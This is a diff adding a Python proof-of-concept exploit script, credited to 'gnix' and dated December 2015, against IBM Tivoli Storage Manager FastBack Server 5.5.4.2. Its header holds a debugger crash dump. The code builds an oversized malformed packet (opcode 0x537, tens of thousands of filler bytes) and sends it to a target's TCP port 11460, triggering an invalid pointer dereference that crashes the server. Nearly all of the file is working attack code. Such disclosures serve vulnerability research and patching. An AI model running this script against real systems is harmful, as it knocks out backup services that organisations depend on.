@@ -1,0 +1,92 @@
+#!/usr/bin/python
+#         
+################################################################################
+#
+#            Title: IBM Tivoli Storage Manager FastBack Server 5.5.4.2
+#                   Invalid Pointer Dereference
+#             Date: 14 December 2015
+#           Author: Gianni Gnesa (gnix) 
+#
+#  Vendor Homepage: http://www.ibm.com/
+#    Software Name: IBM Tivoli Storage Manager FastBack 
+# Software Version: 5.5.4.2 (x86)
+#    Software Link: - Go to https://www-01.ibm.com/marketing/iwm/tnd/search.jsp?pn=Tivoli+Storage+Manager
+#                   - Select "IBM Tivoli Storage Manager FastBack Try-and-Buy" 
+#                     (Version 5.5.4.2, Size: 120.7 MB)
+#
+#        Tested on: Windows 7 Professional (x86)
+#
+################################################################################
+#
+# Crash:
+# ======
+#
+# (f60.654): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=41414141 ebx=01bf4fb8 ecx=41414141 edx=41414141 esi=01bf4fb8 edi=00000000
+# eip=0063d84a esp=01dce0c8 ebp=01dce0cc iopl=0         nv up ei pl nz na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+# FastBackServer!CLocation::GetLocationParams+0xa:
+# 0063d84a 8b4004          mov     eax,dword ptr [eax+4] ds:0023:41414145=????????
+#
+################################################################################
+
+import sys
+import time
+import socket
+from struct import pack
+
+
+def create_pkt(opcode, p1="", p2="", p3=""):
+
+	# psAgentCommand (0x30 bytes)
+	buf = "\x44" * 0xC
+	buf+= pack("<L", opcode)			# opcode
+
+	buf+= pack("<i", 0x0)				# 1st memcpy: offset (in psCommandBuffer.data) for Src field 
+	buf+= pack("<i", len(p1)) 			# 1st memcpy: size field
+	buf+= pack("<i", len(p1))			# 2nd memcpy: offset (in psCommandBuffer.data) for Src field
+	buf+= pack("<i", len(p2)) 			# 2nd memcpy: size field
+	buf+= pack("<i", len(p1) + len(p2))	# 3rd memcpy: offset (in psCommandBuffer.data) for Src field
+	buf+= pack("<i", len(p3)) 			# 3rd memcpy: size field
+
+	buf+= "\x44\x44\x44\x44"
+	buf+= "\x44\x44\x44\x44"
+
+	# psCommandBuffer
+	buf+= p1
+	buf+= p2
+	buf+= p3
+	
+	# buf len - 4 because the packet length is not included
+	buf = pack(">i", len(buf)-4) + buf
+	
+	return buf
+	
+	
+def main():
+	if len(sys.argv) != 2:
+		print "Usage: %s <ip_address>\n" % sys.argv[0]
+		sys.exit(1)
+
+	server = sys.argv[1]
+	port = 11460
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
+	
+	pkt = create_pkt(	opcode = 0x537,
+						p1 = "A" * 24000,
+						p2 = "B" * 24000,
+						p3 = "C" * 1000 )
+
+	s.send(pkt)	
+	s.close()
+    
+	print "[+] Packet sent."
+	sys.exit(0) 
+	
+	
+if __name__ == "__main__":
+	main()
